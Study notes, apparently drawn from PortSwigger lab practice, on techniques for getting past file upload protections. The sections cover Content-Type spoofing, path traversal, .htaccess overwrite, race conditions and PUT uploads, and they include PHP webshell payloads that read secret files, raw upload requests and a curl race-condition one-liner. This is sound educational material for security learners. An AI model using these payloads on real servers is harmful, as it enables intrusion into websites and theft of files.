---
title: File upload
description: My notes on file upload vulnerabilities
---
# Overview
As the name suggests, this vulnerability arises when the server doesn't handle the file upload functionality in a safe manner.

### Defenses and Bypasses

#### Content-Type check bypass
Some websites verify the file type by checking the Content-Type header in the image - under the Content-Disposition header - use a header that the server allows, but change the contents of the image to a code you want to execute. This way you can easily bypass this check. (You might need to change the extension of the file)
#### No execution in directory bypass
You might be able to upload a php file or a png image injected with php code to the website, but you notice that the script isn't executing, this is because some websites apply strict rules to directories where user supplied files are stored. One work around is to use path traversal techniques to bypass this restriction by uploading a file on directory upward where no restrictions apply.
```
POST /upload/image HTTP/2
...

------geckoformboundary1e43662b77484e818bb47ae62211c582
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>
------

GET /uploads/shell.php HTTP/2
...

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
Using the path traversal trick:
```
POST /upload/image HTTP/2
...

------geckoformboundary1e43662b77484e818bb47ae62211c582
Content-Disposition: form-data; name="avatar"; filename="../shell.php"
Content-Type: image/png

<?php echo file_get_contents('/home/user/secret'); ?>
------

GET /uploads/../shell.php HTTP/2
...

This_is_a_secret_dont_tell_any_one
```
You may need  to URL-encode the path traversal sequence for this to work.
#### Insufficient black listing 
Generally speaking, black listing is a bad approach to filtering user input. Some websites use black lists to block any attempt at exploitation, you can easily bypass this by tweaking your input (e.g. php -> PhP,php5)
##### Configuration overwrite
If the server allow you to upload a configuration file - Check the name of the file according to the tech stack used -, for example .htaccess for apache. you can then overwrite rules and allow arbitrary file types and let the server treat them as a scripting language - php -.
``` .htaccess
AddType application/x-httpd-php .abumalik
----

GET /uploads/image.abumalik?c=whoami HTTP/2
...
www-data
```
#### General things to try
- Try multiple extensions like `image.php.png` and vice versa
- Add trailing characters like dots and white spaces like `image.php.`
- Use URL-encoding on slashes and dots
- Add semicolon or null byte before the file extension like `image%00.php`
- Use multibyte unicode characters that convert to dots or nullbytes after normalization.
#### Validation of file contents
Some servers validate the contents of the file. for example, jpg files start with `FF D8 FF` and if the file provided doesn't have these bytes the server might reject it. if the check is this simple you can easily bypass it by inserting a comment containing a malicious code to the image.
#### Race condition
If the server stores the file uploaded on the file system for a short time to make sure everything is correct, you can abuse this window - some times milliseconds - and access the file to execute the code. Note that in this method it is not important to try and bypass other protections because we will access the file before the checks occur, use this payload:
```
curl -v -F user=username -F csrf=CSRF TOKEN -F avatar=@./shell.php https://TARGET/my-account/avatar & curl https://TARGET/files/avatars/shell.php
```
user, csrf and avatar are the field names that are sent in the request.
If the server supports uploading images with URLs, There might be a vulnerability. You can create a huge file and put the malicious code at the start and the rest will be padding -A-, you can then access the file and execute the code. The problem with this is that the website might use a randomizer function and the name of the directory where the file is stored temporarily is unknown.
#### Uploading client-side scripts
you may not be able to upload or execute files like php or asp, but you might be able to upload a js, svg or HTML document with the \<script\> tag. with this method you can carry XSS attacks.
#### Parsing vulnerabilities
If the uploading and serving of the file is secure. Your last bet is to check the parsing of the files requested, if you can upload files like .doc or .xls you can try XXE injection attacks.
#### Uploading files using PUT method
If the server supports the PUT method, it's worth to check if you can upload a malicious file and execute it:
```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com 
Content-Type: application/x-httpd-php 
Content-Length: 49
<?php echo file_get_contents('/path/to/file'); ?>
```

### Resources
Check the academy for practice at [Portswigger](https://portswigger.net/web-security/file-upload)<br>
Also Owasp have great info as always [Owasp](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)